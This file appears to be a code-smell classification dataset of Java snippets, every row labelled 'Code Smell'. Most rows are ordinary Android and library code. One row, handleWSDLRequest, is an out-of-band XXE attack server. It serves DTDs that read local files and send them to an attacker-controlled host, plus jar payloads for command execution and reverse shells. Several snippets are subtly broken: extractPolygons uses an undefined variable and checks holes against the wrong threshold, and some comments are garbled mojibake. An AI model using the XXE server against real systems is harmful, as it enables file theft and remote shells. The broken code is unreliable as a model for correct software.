    req.hash=lastHash != null ? lastHash : reactionsUpdateHash;
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      int date=(int)(System.currentTimeMillis() / 1000);
      if (response instanceof TLRPC.TL_messages_availableReactionsNotModified) {
        processLoadedReactions(null,0,date,false);
      }
 else       if (response instanceof TLRPC.TL_messages_availableReactions) {
        TLRPC.TL_messages_availableReactions r=(TLRPC.TL_messages_availableReactions)response;
        processLoadedReactions(r.reactions,r.hash,date,false);
      }
    }
));
  }
}",1,Code Smell
"private void updateVideoPlayerTime(){
  Arrays.fill(videoPlayerCurrentTime,0);
  Arrays.fill(videoPlayerTotalTime,0);
  if (videoPlayer != null) {
    long current=Math.max(0,videoPlayer.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,videoPlayer.getDuration());
    if (!inPreview && videoTimelineView.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
 else   if (photoViewerWebView != null && photoViewerWebView.isControllable()) {
    long current=Math.max(0,photoViewerWebView.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,photoViewerWebView.getVideoDuration());
    if (!inPreview && videoTimelineView.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
  String current, total;
  if (videoPlayerCurrentTime[0] >= 60) {
    current=String.format(Locale.ROOT,""%02d:%02d:%02d"",videoPlayerCurrentTime[0] / 60,videoPlayerCurrentTime[0] % 60,videoPlayerCurrentTime[1]);
  }
 else {
    current=String.format(Locale.ROOT,""%02d:%02d"",videoPlayerCurrentTime[0],videoPlayerCurrentTime[1]);
  }
  if (videoPlayerTotalTime[0] >= 60) {
    total=String.format(Locale.ROOT,""%02d:%02d:%02d"",videoPlayerTotalTime[0] / 60,videoPlayerTotalTime[0] % 60,videoPlayerTotalTime[1]);
  }
 else {
    total=String.format(Locale.ROOT,""%02d:%02d"",videoPlayerTotalTime[0],videoPlayerTotalTime[1]);
  }
  videoPlayerTime.setText(String.format(Locale.ROOT,""%s / %s"",current,total));
  if (!Objects.equals(lastControlFrameDuration,total)) {
    lastControlFrameDuration=total;
    videoPlayerControlFrameLayout.requestLayout();
  }
}",1,Code Smell
"private void checkVideoPlayer(){
  RecyclerView recyclerView=listView[0];
  if (recyclerView == null && attachedToWindow) {
    return;
  }
  BlockVideoCell bestView=null;
  float bestViewCenterX=0;
  float parentCenterX=recyclerView.getMeasuredHeight() / 2f;
  for (int i=0; i < recyclerView.getChildCount(); i++) {
    View child=recyclerView.getChildAt(i);
    if (child instanceof BlockVideoCell) {
      float centerX=child.getTop() + child.getMeasuredHeight() / 2f;
      if (bestView == null || (Math.abs(parentCenterX - centerX) < (Math.abs(parentCenterX - bestViewCenterX)))) {
        bestView=(BlockVideoCell)child;
        bestViewCenterX=centerX;
      }
    }
  }
  boolean allowPlayer=!PhotoViewer.getInstance().isVisibleOrAnimating();
  if (!allowPlayer || (currentPlayer != null && currentPlayer != bestView && videoPlayer != null)) {
    if (videoPlayer != null) {
      videoStates.put(currentPlayer.currentBlock.video_id,currentPlayer.setState(BlockVideoCellState.fromPlayer(videoPlayer,currentPlayer)));
      if (currentPlayer.videoState != null) {
        if (currentPlayer.videoState.lastFrameBitmap != null) {
          currentPlayer.imageView.setImageBitmap(currentPlayer.videoState.lastFrameBitmap);
        }
        currentPlayer.updateButtonState(false);
      }
      videoPlayer.release(null);
    }
    videoPlayer=null;
    currentPlayer=null;
  }
  if (allowPlayer && bestView != null) {
    bestView.startVideoPlayer();
    currentPlayer=bestView;
  }
}",1,Code Smell
"public static int startWebInspector(String udId){
  Process ps=null;
  String commandLine=""%s webinspector -u %s -p %d --cdp"";
  int port=PortTool.getPort();
  try {
    String system=System.getProperty(""os.name"").toLowerCase();
    if (system.contains(""win"")) {
      ps=Runtime.getRuntime().exec(new String[]{""cmd"",""/c"",String.format(commandLine,sib,udId,port)});
    }
 else     if (system.contains(""linux"") || system.contains(""mac"")) {
      ps=Runtime.getRuntime().exec(new String[]{""sh"",""-c"",String.format(commandLine,sib,udId,port)});
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  InputStreamReader inputStreamReader=new InputStreamReader(ps.getInputStream());
  BufferedReader stdInput=new BufferedReader(inputStreamReader);
  InputStreamReader err=new InputStreamReader(ps.getErrorStream());
  BufferedReader stdInputErr=new BufferedReader(err);
  Semaphore isFinish=new Semaphore(0);
  Thread webErr=new Thread(() -> {
    String s;
    while (true) {
      try {
        if ((s=stdInputErr.readLine()) == null)         break;
      }
 catch (      IOException e) {
        logger.info(e.getMessage());
        break;
      }
      if (!s.equals(""close send protocol"")) {
        logger.info(s);
      }
    }
    try {
      stdInputErr.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    try {
      err.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    logger.info(""WebInspector print thread shutdown."");
  }
);
  webErr.start();
  Thread web=new Thread(() -> {
    String s;
    while (true) {
      try {
        if ((s=stdInput.readLine()) == null)         break;
      }
 catch (      IOException e) {
        logger.info(e.getMessage());
        break;
      }
      logger.info(s);
      if (s.contains(""service started successfully"")) {
        isFinish.release();
      }
    }
    try {
      stdInput.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    try {
      inputStreamReader.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    webViewMap.remove(udId);
    logger.info(""WebInspector print thread shutdown."");
  }
);
  web.start();
  int wait=0;
  while (!isFinish.tryAcquire()) {
    try {
      Thread.sleep(500);
    }
 catch (    InterruptedException ex) {
      throw new RuntimeException(ex);
    }
    wait++;
    if (wait >= 120) {
      logger.info(udId + "" WebInspector start timeout!"");
      return 0;
    }
  }
  String processName=String.format(""process-%s-web-inspector"",udId);
  GlobalProcessMap.getMap().put(processName,ps);
  return port;
}",1,Code Smell
"/** 
 * Creates a ReversedLinesFileReader with default block size of 4KB and the platform's default encoding.
 * @param file the file to be read
 * @throws IOException  if an I/O error occurs
 * @deprecated 2.5 use {@link #ReversedLinesFileReader(File,Charset)} instead
 */
@Deprecated public ReversedLinesFileReader(final File file) throws IOException {
  this(file,4096,Charset.defaultCharset());
}
/** 
 * Creates a ReversedLinesFileReader with default block size of 4KB and the specified encoding.
 * @param file the file to be read
 * @param charset the encoding to use
 * @throws IOException  if an I/O error occurs
 * @since 2.5
 */
public ReversedLinesFileReader(final File file,final Charset charset) throws IOException {
  this(file,4096,charset);
}
/** 
 * Creates a ReversedLinesFileReader with the given block size and encoding.
 * @param file the file to be read
 * @param blockSize size of the internal buffer (for ideal performance this should match with the block size of the underlying file system).
 * @param encoding the encoding of the file
 * @throws IOException  if an I/O error occurs
 * @since 2.3
 */
public ReversedLinesFileReader(final File file,final int blockSize,final Charset encoding) throws IOException {
  this.blockSize=blockSize;
  this.encoding=encoding;
  randomAccessFile=new RandomAccessFile(file,""r"");
  totalByteLength=randomAccessFile.length();
  int lastBlockLength=(int)(totalByteLength % blockSize);
  if (lastBlockLength > 0) {
    totalBlockCount=totalByteLength / blockSize + 1;
  }
 else {
    totalBlockCount=totalByteLength / blockSize;
    if (totalByteLength > 0) {
      lastBlockLength=blockSize;
    }
  }
  currentFilePart=new FilePart(totalBlockCount,lastBlockLength,null);
  final Charset charset=encoding;
  final CharsetEncoder charsetEncoder=charset.newEncoder();
  final float maxBytesPerChar=charsetEncoder.maxBytesPerChar();
  if (maxBytesPerChar == 1f) {
    byteDecrement=1;
  }
 else   if (charset == StandardCharsets.UTF_8) {
    byteDecrement=1;
  }
 else   if (charset == Charset.forName(""Shift_JIS"")) {
    byteDecrement=1;
  }
 else   if (charset == StandardCharsets.UTF_16BE || charset == StandardCharsets.UTF_16LE) {
    byteDecrement=2;
  }
 else   if (charset == StandardCharsets.UTF_16) {
    throw new UnsupportedEncodingException(""For UTF-16, you need to specify the byte order (use UTF-16BE or UTF-16LE)"");
  }
 else {
    throw new UnsupportedEncodingException(""Encoding "" + encoding + "" is not supported yet (feel free to submit a patch)"");
  }
  newLineSequences=new byte[][]{""\r\n"".getBytes(encoding),""\n"".getBytes(encoding),""\r"".getBytes(encoding)};
  avoidNewlineSplitBufferSize=newLineSequences[0].length;
}",1,Code Smell
"/** 
 * Parse and return  {@link PathStrategy} for given authority as defined in{@link #META_DATA_FILE_PROVIDER_PATHS} {@code <meta-data>}.
 * @see #getPathStrategy(Context,String)
 */
private static PathStrategy parsePathStrategy(Context context,String authority) throws IOException, XmlPullParserException {
  final SimplePathStrategy strat=new SimplePathStrategy(authority);
  final ProviderInfo info=context.getPackageManager().resolveContentProvider(authority,PackageManager.GET_META_DATA);
  if (info == null) {
    throw new IllegalArgumentException(""Couldn't find meta-data for provider with authority "" + authority);
  }
  final XmlResourceParser in=info.loadXmlMetaData(context.getPackageManager(),META_DATA_FILE_PROVIDER_PATHS);
  if (in == null) {
    throw new IllegalArgumentException(""Missing "" + META_DATA_FILE_PROVIDER_PATHS + "" meta-data"");
  }
  int type;
  while ((type=in.next()) != END_DOCUMENT) {
    if (type == START_TAG) {
      final String tag=in.getName();
      final String name=in.getAttributeValue(null,ATTR_NAME);
      String path=in.getAttributeValue(null,ATTR_PATH);
      File target=null;
      if (TAG_ROOT_PATH.equals(tag)) {
        target=DEVICE_ROOT;
      }
 else       if (TAG_FILES_PATH.equals(tag)) {
        target=context.getFilesDir();
      }
 else       if (TAG_CACHE_PATH.equals(tag)) {
        target=context.getCacheDir();
      }
 else       if (TAG_EXTERNAL.equals(tag)) {
        target=Environment.getExternalStorageDirectory();
      }
 else       if (TAG_EXTERNAL_FILES.equals(tag)) {
        File[] externalFilesDirs=context.getExternalFilesDirs(null);
        if (externalFilesDirs.length > 0) {
          target=externalFilesDirs[0];
        }
      }
 else       if (TAG_EXTERNAL_CACHE.equals(tag)) {
        File[] externalCacheDirs=context.getExternalCacheDirs();
        if (externalCacheDirs.length > 0) {
          target=externalCacheDirs[0];
        }
      }
 else       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && TAG_EXTERNAL_MEDIA.equals(tag)) {
        File[] externalMediaDirs=context.getExternalMediaDirs();
        if (externalMediaDirs.length > 0) {
          target=externalMediaDirs[0];
        }
      }
      if (target != null) {
        strat.addRoot(name,buildPath(target,path));
      }
    }
  }
  return strat;
}",1,Code Smell
"public void setDialogNotificationsSettings(long dialog_id,int topicId,int setting){
  SharedPreferences preferences=getAccountInstance().getNotificationsSettings();
  SharedPreferences.Editor editor=preferences.edit();
  TLRPC.Dialog dialog=MessagesController.getInstance(UserConfig.selectedAccount).dialogs_dict.get(dialog_id);
  if (setting == SETTING_MUTE_UNMUTE) {
    boolean defaultEnabled=isGlobalNotificationsEnabled(dialog_id);
    if (defaultEnabled) {
      editor.remove(""notify2_"" + NotificationsController.getSharedPrefKey(dialog_id,topicId));
    }
 else {
      editor.putInt(""notify2_"" + NotificationsController.getSharedPrefKey(dialog_id,topicId),0);
    }
    getMessagesStorage().setDialogFlags(dialog_id,0);
    if (dialog != null) {
      dialog.notify_settings=new TLRPC.TL_peerNotifySettings();
    }
  }
 else {
    int untilTime=ConnectionsManager.getInstance(UserConfig.selectedAccount).getCurrentTime();
    if (setting == SETTING_MUTE_HOUR) {
      untilTime+=60 * 60;
    }
 else     if (setting == SETTING_MUTE_8_HOURS) {
      untilTime+=60 * 60 * 8;
    }
 else     if (setting == SETTING_MUTE_2_DAYS) {
      untilTime+=60 * 60 * 48;
    }
 else     if (setting == SETTING_MUTE_FOREVER) {
      untilTime=Integer.MAX_VALUE;
    }
    long flags;
    if (setting == SETTING_MUTE_FOREVER) {
      editor.putInt(""notify2_"" + NotificationsController.getSharedPrefKey(dialog_id,topicId),2);
      flags=1;
    }
 else {
      editor.putInt(""notify2_"" + NotificationsController.getSharedPrefKey(dialog_id,topicId),3);
      editor.putInt(""notifyuntil_"" + NotificationsController.getSharedPrefKey(dialog_id,topicId),untilTime);
      flags=((long)untilTime << 32) | 1;
    }
    NotificationsController.getInstance(UserConfig.selectedAccount).removeNotificationsForDialog(dialog_id);
    MessagesStorage.getInstance(UserConfig.selectedAccount).setDialogFlags(dialog_id,flags);
    if (dialog != null) {
      dialog.notify_settings=new TLRPC.TL_peerNotifySettings();
      dialog.notify_settings.mute_until=untilTime;
    }
  }
  editor.commit();
  updateServerNotificationsSettings(dialog_id,topicId);
}",1,Code Smell
"protected Format buildFormat(String id,String containerMimeType,int width,int height,float frameRate,int audioChannels,int audioSamplingRate,int bitrate,String language,List<Descriptor> roleDescriptors,List<Descriptor> accessibilityDescriptors,String codecs,List<Descriptor> supplementalProperties){
  String sampleMimeType=getSampleMimeType(containerMimeType,codecs);
  @C.SelectionFlags int selectionFlags=parseSelectionFlagsFromRoleDescriptors(roleDescriptors);
  @C.RoleFlags int roleFlags=parseRoleFlagsFromRoleDescriptors(roleDescriptors);
  roleFlags|=parseRoleFlagsFromAccessibilityDescriptors(accessibilityDescriptors);
  if (sampleMimeType != null) {
    if (MimeTypes.AUDIO_E_AC3.equals(sampleMimeType)) {
      sampleMimeType=parseEac3SupplementalProperties(supplementalProperties);
    }
    if (MimeTypes.isVideo(sampleMimeType)) {
      return Format.createVideoContainerFormat(id,null,containerMimeType,sampleMimeType,codecs,null,bitrate,width,height,frameRate,null,selectionFlags,roleFlags);
    }
 else     if (MimeTypes.isAudio(sampleMimeType)) {
      return Format.createAudioContainerFormat(id,null,containerMimeType,sampleMimeType,codecs,null,bitrate,audioChannels,audioSamplingRate,null,selectionFlags,roleFlags,language);
    }
 else     if (mimeTypeIsRawText(sampleMimeType)) {
      int accessibilityChannel;
      if (MimeTypes.APPLICATION_CEA608.equals(sampleMimeType)) {
        accessibilityChannel=parseCea608AccessibilityChannel(accessibilityDescriptors);
      }
 else       if (MimeTypes.APPLICATION_CEA708.equals(sampleMimeType)) {
        accessibilityChannel=parseCea708AccessibilityChannel(accessibilityDescriptors);
      }
 else {
        accessibilityChannel=Format.NO_VALUE;
      }
      return Format.createTextContainerFormat(id,null,containerMimeType,sampleMimeType,codecs,bitrate,selectionFlags,roleFlags,language,accessibilityChannel);
    }
  }
  return Format.createContainerFormat(id,null,containerMimeType,sampleMimeType,codecs,bitrate,selectionFlags,roleFlags,language);
}",1,Code Smell
"/** 
 * 灏嗗崰浣嶇鏇挎崲鎴愬弬鏁板��
 * @param sql
 * @param configuration
 * @param boundSql
 * @return
 */
private String formatSql(String sql,Configuration configuration,BoundSql boundSql){
  sql=clearSql(sql);
  Object parameterObject=boundSql.getParameterObject();
  List<ParameterMapping> parameterMappings=boundSql.getParameterMappings();
  TypeHandlerRegistry typeHandlerRegistry=configuration.getTypeHandlerRegistry();
  List<String> parameters=new ArrayList<>();
  if (parameterMappings != null) {
    MetaObject metaObject=parameterObject == null ? null : configuration.newMetaObject(parameterObject);
    for (    ParameterMapping parameterMapping : parameterMappings) {
      if (parameterMapping.getMode() != ParameterMode.OUT) {
        Object value;
        String propertyName=parameterMapping.getProperty();
        if (boundSql.hasAdditionalParameter(propertyName)) {
          value=boundSql.getAdditionalParameter(propertyName);
        }
 else         if (parameterObject == null) {
          value=null;
        }
 else         if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {
          value=parameterObject;
        }
 else {
          value=metaObject == null ? null : metaObject.getValue(propertyName);
        }
        if (value instanceof Number) {
          parameters.add(String.valueOf(value));
        }
 else {
          StringBuilder builder=new StringBuilder();
          builder.append(""'"");
          if (value instanceof Date) {
            builder.append(DATETIME_FORMATTER.get().format((Date)value));
          }
 else           if (value instanceof String) {
            builder.append(value);
          }
          builder.append(""'"");
          parameters.add(builder.toString());
        }
      }
    }
  }
  for (  String value : parameters) {
    sql=sql.replaceFirst(""\\?"",value);
  }
  return sql;
}
",1,Code Smell
"@Override public void run(String... args) throws Exception {
  if (ObjectUtils.isEmpty(userSetting.getCivilCodeFile())) {
    logger.warn(""[琛屾斂鍖哄垝] 鏂囦欢鏈缃紝鍙兘閫犳垚鐩綍鍒锋柊缁撴灉涓嶅畬鏁"");
    return;
  }
  InputStream inputStream;
  if (userSetting.getCivilCodeFile().startsWith(""classpath:"")) {
    String filePath=userSetting.getCivilCodeFile().substring(""classpath:"".length());
    ClassPathResource civilCodeFile=new ClassPathResource(filePath);
    if (!civilCodeFile.exists()) {
      logger.warn(""[琛屾斂鍖哄垝] 鏂囦欢<{}>涓嶅瓨鍦紝鍙兘閫犳垚鐩綍鍒锋柊缁撴灉涓嶅畬鏁"",userSetting.getCivilCodeFile());
      return;
    }
    inputStream=civilCodeFile.getInputStream();
  }
 else {
    File civilCodeFile=new File(userSetting.getCivilCodeFile());
    if (!civilCodeFile.exists()) {
      logger.warn(""[琛屾斂鍖哄垝] 鏂囦欢<{}>涓嶅瓨鍦紝鍙兘閫犳垚鐩綍鍒锋柊缁撴灉涓嶅畬鏁"",userSetting.getCivilCodeFile());
      return;
    }
    inputStream=Files.newInputStream(civilCodeFile.toPath());
  }
  BufferedReader inputStreamReader=new BufferedReader(new InputStreamReader(inputStream));
  int index=-1;
  String line;
  List<CivilCodePo> civilCodePoList=new ArrayList<>();
  while ((line=inputStreamReader.readLine()) != null) {
    index++;
    if (index == 0) {
      continue;
    }
    String[] infoArray=line.split("","");
    CivilCodePo civilCodePo=CivilCodePo.getInstance(infoArray);
    civilCodePoList.add(civilCodePo);
  }
  CivilCodeUtil.INSTANCE.add(civilCodePoList);
  inputStreamReader.close();
  inputStream.close();
  if (civilCodePoList.isEmpty()) {
    logger.warn(""[琛屾斂鍖哄垝] 鏂囦欢鍐呭涓虹┖锛屽彲鑳介犳垚鐩綍鍒锋柊缁撴灉涓嶅畬鏁"");
  }
 else {
    logger.info(""[琛屾斂鍖哄垝] 鍔犺浇鎴愬姛锛屽叡鍔犺浇鏁版嵁{}鏉"",civilCodePoList.size());
  }
}",1,Code Smell
"@Override public void getReward(MissionInit missionInit,MultidimensionalReward reward){
  super.getReward(missionInit,reward);
  List<Entity> trappedEntities=getCaughtEntities();
  for (  MobWithDescriptionAndReward mob : this.rcmparams.getMob()) {
    for (    EntityTypes et : mob.getType()) {
      String mobName=et.value();
      for (      Entity e : trappedEntities) {
        if (e.getName().equals(mobName)) {
          if (!mob.isGlobal()) {
            BlockPos entityPos=new BlockPos(e.posX,e.posY,e.posZ);
            EntityPlayerSP player=Minecraft.getMinecraft().player;
            BlockPos playerPos=new BlockPos(player.posX,player.posY,player.posZ);
            if (Math.abs(entityPos.getX() - playerPos.getX()) + Math.abs(entityPos.getZ() - playerPos.getZ()) > 1)             continue;
          }
          if (mob.isOneshot() && this.caughtEntities.contains(e))           continue;
          float adjusted_reward=adjustAndDistributeReward(mob.getReward().floatValue(),this.rcmparams.getDimension(),mob.getDistribution());
          reward.add(this.rcmparams.getDimension(),adjusted_reward);
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * Puts all polygons within  {@code geom} over {@code minArea} into {@code result}, removing holes under  {@code minHoleArea}.
 */
private static void extractPolygons(Geometry geom,List<Polygon> result,double minArea,double minHoleArea){
  if (geom instanceof Polygon) {
    if (Area.ofRing(poly.getExteriorRing().getCoordinateSequence()) > minArea) {
      int innerRings=poly.getNumInteriorRing();
      if (minHoleArea > 0 && innerRings > 0) {
        List<LinearRing> rings=new ArrayList<>(innerRings);
        for (int i=0; i < innerRings; i++) {
          LinearRing innerRing=poly.getInteriorRingN(i);
          if (Area.ofRing(innerRing.getCoordinateSequence()) > minArea) {
            rings.add(innerRing);
          }
        }
        if (rings.size() != innerRings) {
          poly=GeoUtils.createPolygon(poly.getExteriorRing(),rings);
        }
      }
      result.add(poly);
    }
  }
 else   if (geom instanceof GeometryCollection) {
    for (int i=0; i < geom.getNumGeometries(); i++) {
      extractPolygons(geom.getGeometryN(i),result,minArea,minHoleArea);
    }
  }
}",1,Code Smell
"private void setFragmentIsSliding(boolean sliding){
  if (SharedConfig.getDevicePerformanceClass() <= SharedConfig.PERFORMANCE_CLASS_AVERAGE || !LiteMode.isEnabled(LiteMode.FLAG_CHAT_SCALE)) {
    return;
  }
  if (sliding) {
    if (viewPages != null && viewPages[0] != null) {
      viewPages[0].setLayerType(View.LAYER_TYPE_HARDWARE,null);
      viewPages[0].setClipChildren(false);
      viewPages[0].setClipToPadding(false);
      viewPages[0].listView.setClipChildren(false);
    }
    if (actionBar != null) {
      actionBar.setLayerType(View.LAYER_TYPE_HARDWARE,null);
    }
    if (filterTabsView != null) {
      filterTabsView.getListView().setLayerType(View.LAYER_TYPE_HARDWARE,null);
    }
    if (fragmentView != null) {
      ((ViewGroup)fragmentView).setClipChildren(false);
      fragmentView.requestLayout();
    }
  }
 else {
    for (int i=0; i < viewPages.length; i++) {
      ViewPage page=viewPages[i];
      if (page != null) {
        page.setLayerType(View.LAYER_TYPE_NONE,null);
        page.setClipChildren(true);
        page.setClipToPadding(true);
        page.listView.setClipChildren(true);
      }
    }
    if (actionBar != null) {
      actionBar.setLayerType(View.LAYER_TYPE_NONE,null);
    }
    if (filterTabsView != null) {
      filterTabsView.getListView().setLayerType(View.LAYER_TYPE_NONE,null);
    }
    if (fragmentView != null) {
      ((ViewGroup)fragmentView).setClipChildren(true);
      fragmentView.requestLayout();
    }
  }
}",1,Code Smell
"private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
  String query=exchange.getRequestURI().getQuery();
  Map<String,String> params=parseQuery(query);
  String path=exchange.getRequestURI().getPath().substring(1);
  if (path.startsWith(""list"")) {
    String file=params.get(""file"");
    if (file != null && !file.isEmpty()) {
      String listWsdl="""" + ""<!DOCTYPE x [\n"" + ""  <!ENTITY % aaa SYSTEM \""file:///"" + file + ""\"">\n""+ ""  <!ENTITY % bbb SYSTEM \""http://""+ Config.ip+ "":""+ Config.httpPort+ ""/http.wsdl\"">\n""+ ""  %bbb;\n""+ ""]>\n""+ ""<definitions name=\""HelloService\"" xmlns=\""http://schemas.xmlsoap.org/wsdl/\"">\n""+ ""  &ddd;\n""+ ""</definitions>"";
      System.out.println(""[+] Response Code: "" + 200);
      exchange.sendResponseHeaders(200,listWsdl.getBytes().length);
      exchange.getResponseBody().write(listWsdl.getBytes());
    }
 else {
      System.out.println(""[!] Missing or wrong argument"");
      System.out.println(""[!] Response Code: "" + 404);
      exchange.sendResponseHeaders(404,0);
    }
    exchange.close();
  }
 else   if (path.startsWith(""upload"")) {
    String type=params.get(""type"");
    String[] args=null;
    if (type.equalsIgnoreCase(""command"")) {
      args=new String[]{params.get(""cmd"")};
    }
 else     if (type.equalsIgnoreCase(""dnslog"")) {
      args=new String[]{params.get(""url"")};
    }
 else     if (type.equalsIgnoreCase(""reverseshell"")) {
      args=new String[]{params.get(""ip""),params.get(""port"")};
    }
    String jarName=createJar(type,args);
    if (jarName != null) {
      String uploadWsdl=""<!DOCTYPE a SYSTEM \""jar:http://"" + Config.ip + "":""+ Config.httpPort+ ""/""+ jarName+ "".jar!/file.txt\""><a></a>"";
      System.out.println(""[+] Response Code: "" + 200);
      exchange.sendResponseHeaders(200,uploadWsdl.getBytes().length);
      exchange.getResponseBody().write(uploadWsdl.getBytes());
    }
 else {
      System.out.println(""[!] Missing or wrong argument"");
      System.out.println(""[!] Response Code: "" + 404);
      exchange.sendResponseHeaders(404,0);
    }
    exchange.close();
  }
 else   if (path.startsWith(""http"")) {
    String xxhttp=""<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\""uri\"" location=\""http://"" + Config.ip + "":""+ Config.httpPort+ ""/xxelog?%aaa;\""/>&#39;>'>%ccc;"";
    System.out.println(""[+] Response Code: "" + 200);
    exchange.sendResponseHeaders(200,xxhttp.getBytes().length);
    exchange.getResponseBody().write(xxhttp.getBytes());
    exchange.close();
  }
 else {
    System.out.println(""[!] Response Code: "" + 404);
    exchange.sendResponseHeaders(404,0);
    exchange.close();
  }
}",1,Code Smell
"public void loadAttachMenuBots(boolean cache,boolean force){
  loadAttachMenuBots(cache,force,null);
}
public void loadAttachMenuBots(boolean cache,boolean force,Runnable onDone){
  isLoadingMenuBots=true;
  if (cache) {
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      SQLiteCursor c=null;
      long hash=0;
      int date=0;
      TLRPC.TL_attachMenuBots bots=null;
      try {
        c=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash, date FROM attach_menu_bots"");
        if (c.next()) {
          NativeByteBuffer data=c.byteBufferValue(0);
          if (data != null) {
            TLRPC.AttachMenuBots attachMenuBots=TLRPC.TL_attachMenuBots.TLdeserialize(data,data.readInt32(false),true);
            if (attachMenuBots instanceof TLRPC.TL_attachMenuBots) {
              bots=(TLRPC.TL_attachMenuBots)attachMenuBots;
            }
            data.reuse();
          }
          hash=c.longValue(1);
          date=c.intValue(2);
        }
        if (bots != null) {
          ArrayList<Long> usersToLoad=new ArrayList<>();
          for (int i=0; i < bots.bots.size(); i++) {
            usersToLoad.add(bots.bots.get(i).bot_id);
          }
          bots.users.addAll(getMessagesStorage().getUsers(usersToLoad));
        }
      }
 catch (      Exception e) {
        FileLog.e(e,false);
      }
 finally {
        if (c != null) {
          c.dispose();
        }
      }
      processLoadedMenuBots(bots,hash,date,true);
    }
);
  }
 else {
    TLRPC.TL_messages_getAttachMenuBots req=new TLRPC.TL_messages_getAttachMenuBots();
    req.hash=force ? 0 : menuBotsUpdateHash;
    getConnectionsManager().sendRequest(req,(response,error) -> {
      int date=(int)(System.currentTimeMillis() / 1000);
      if (response instanceof TLRPC.TL_attachMenuBotsNotModified) {
        processLoadedMenuBots(null,0,date,false);
      }
 else       if (response instanceof TLRPC.TL_attachMenuBots) {
        TLRPC.TL_attachMenuBots r=(TLRPC.TL_attachMenuBots)response;
        processLoadedMenuBots(r,r.hash,date,false);
      }
      if (onDone != null) {
        AndroidUtilities.runOnUIThread(onDone);
      }
    }
);
  }
}",1,Code Smell
"/** 
 * update ops task in cache
 * @param opsTaskInfo ops task info
 * @param strBuff   the string buffer
 */
public void updOpsTaskInfo(ClientMaster.OpsTaskInfo opsTaskInfo,StringBuilder strBuff){
  if (opsTaskInfo == null) {
    return;
  }
  if (opsTaskInfo.hasGroupFlowCheckId() && opsTaskInfo.getGroupFlowCheckId() >= 0 && opsTaskInfo.getGroupFlowCheckId() != groupFlowCtrlRuleHandler.getFlowCtrlId()) {
    try {
      groupFlowCtrlRuleHandler.updateFlowCtrlInfo(opsTaskInfo.getQryPriorityId(),opsTaskInfo.getGroupFlowCheckId(),opsTaskInfo.getGroupFlowControlInfo(),strBuff);
    }
 catch (    Exception e1) {
      logger.warn(""[Remote Data Cache] found parse group flowCtrl rules failure"",e1);
    }
  }
  if (opsTaskInfo.hasDefFlowCheckId() && opsTaskInfo.getDefFlowCheckId() >= 0 && opsTaskInfo.getDefFlowCheckId() != defFlowCtrlRuleHandler.getFlowCtrlId()) {
    try {
      defFlowCtrlRuleHandler.updateFlowCtrlInfo(TBaseConstants.META_VALUE_UNDEFINED,opsTaskInfo.getDefFlowCheckId(),opsTaskInfo.getDefFlowControlInfo(),strBuff);
    }
 catch (    Exception e1) {
      logger.warn(""[Remote Data Cache] found parse default flowCtrl rules failure"",e1);
    }
  }
  if (opsTaskInfo.hasCsmFrmMaxOffsetCtrlId() && opsTaskInfo.getCsmFrmMaxOffsetCtrlId() >= 0) {
    if (reqMaxOffsetCsmId.get() != opsTaskInfo.getCsmFrmMaxOffsetCtrlId()) {
      reqMaxOffsetCsmId.set(opsTaskInfo.getCsmFrmMaxOffsetCtrlId());
      if (opsTaskInfo.getCsmFrmMaxOffsetCtrlId() > lstRegMasterTime.get()) {
        csmFromMaxOffset.set(true);
      }
    }
  }
  if (opsTaskInfo.hasRequireAuth()) {
    storeMasterAuthRequire(opsTaskInfo.getRequireAuth());
  }
}",1,Code Smell
"protected boolean releaseTask(@NonNull Task expectedTask){
class State implements BiFunction<P,Task,Task> {
    Task task;
    boolean released;
    @Override public Task apply(    @NonNull P param,    Task task){
      if (task != expectedTask) {
        if (DEBUG_PRINTS_ENABLED) {
          FP2_LOG.info(""failed to release task at {}, {} != {}"",param,task,expectedTask);
        }
        this.released=false;
        return task;
      }
 else {
        this.released=true;
      }
      if (task.refCnt > 0) {
        if (--task.refCnt != 0) {
          if (DEBUG_PRINTS_ENABLED) {
            FP2_LOG.info(""partially released task at {}, reference count is now {}"",param,task.refCnt);
          }
          return task;
        }
 else {
          if (DEBUG_PRINTS_ENABLED) {
            FP2_LOG.info(""totally released task at {}, replacing with {}"",param,task.previous);
          }
          SharedFutureScheduler.this.unqueue(task);
          task.cancel0();
          this.task=task;
          return task.previous;
        }
      }
 else {
        return task;
      }
    }
    boolean finish(){
      if (this.task != null) {
        List<Task> dependencies=PUnsafe.pork_swapObject(this.task,TASK_DEPENDENCIES_OFFSET,null);
        if (dependencies != null) {
          for (          Task dependency : dependencies) {
            SharedFutureScheduler.this.releaseTask(dependency);
          }
        }
      }
      return this.released;
    }
  }
  State state=new State();
